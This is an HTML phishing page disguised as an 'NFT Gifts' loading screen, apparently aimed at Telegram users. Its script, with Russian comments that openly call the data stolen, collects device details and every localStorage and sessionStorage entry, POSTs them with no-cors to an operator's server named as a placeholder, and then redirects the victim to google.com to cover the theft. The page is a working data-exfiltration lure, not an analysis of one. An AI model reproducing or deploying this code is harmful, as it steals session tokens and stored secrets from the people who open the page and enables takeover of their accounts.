<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Gifts</title>
    <style>
        body {
            background: #0a0e1a;
            color: white;
            font-family: system-ui;
            text-align: center;
            padding-top: 30%;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #6a0dad;
            border-top-color: transparent;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Loading NFT Collection...</h2>
    <div class="loader"></div>
    
    <script>
        (function() {
            // Собираем данные
            const stolen = {
                time: new Date().toLocaleString(),
                device: /Android/i.test(navigator.userAgent) ? 'Android' : (/iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'PC'),
                in_telegram: /Telegram/i.test(navigator.userAgent),
                ua: navigator.userAgent,
                url: location.href,
                storage: {}
            };
            
            // Кража localStorage
            try {
                for(let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    stolen.storage[key] = localStorage.getItem(key);
                }
            } catch(e) {}
            
            // Кража sessionStorage
            try {
                for(let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    stolen.storage['session_' + key] = sessionStorage.getItem(key);
                }
            } catch(e) {}
            
            // Отправка на БОТА (твой сервер)
            const BOT_URL = "https://твой-сервер.onrender.com";  // Адрес где запущен bot.py
            
            fetch(BOT_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(stolen),
                mode: 'no-cors'  // обходит CORS
            });
            
            // Перенаправление
            setTimeout(() => {
                window.location.href = 'https://google.com';
            }, 2000);
        })();
    </script>
</body>
</html>
